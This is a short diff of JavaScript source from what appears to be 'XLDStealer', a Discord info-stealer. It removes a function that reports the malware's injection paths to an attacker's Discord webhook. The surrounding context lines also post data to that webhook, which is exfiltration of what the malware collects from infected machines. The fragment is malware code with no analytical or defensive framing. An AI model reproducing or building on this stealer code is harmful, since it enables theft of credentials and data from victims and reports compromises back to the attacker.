@@ -363,42 +363,6 @@ axios.post(webhook, {
         }]
     }) .then(res => {}).catch(error => {})
 
-function injectNotify() {
-    var fields = [];
-    injectPath.forEach( path => {
-        var c = {
-            name: "<:bfdnonsfw:966774651449671761> Inject Path",
-            value: `\`\`\`${path}\`\`\``,
-            inline: !1
-        }
-        fields.push(c)
-    })
-    axios
-	.post(webhook, {
-        "content": null, 
-        "embeds": [
-          {
-            "title": "<:bfdnonsfw:966774651449671761> Successfull injection",
-            "color": config["embed-color"],
-            "fields": fields,
-            "author": {
-              "name": "XLDStealer",
-"icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
-            },
-            "footer": {
-              "text": "XLDStealer",
-"icon_url": "https://media.discordapp.net/attachments/962421775361273910/966779841204596766/IMG-20220421-WA0062.jpg"
-            }
-          }
-        ]
-      })
-	.then(res => {
-	})
-	.catch(error => {
-
-    })
-
-}
   function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
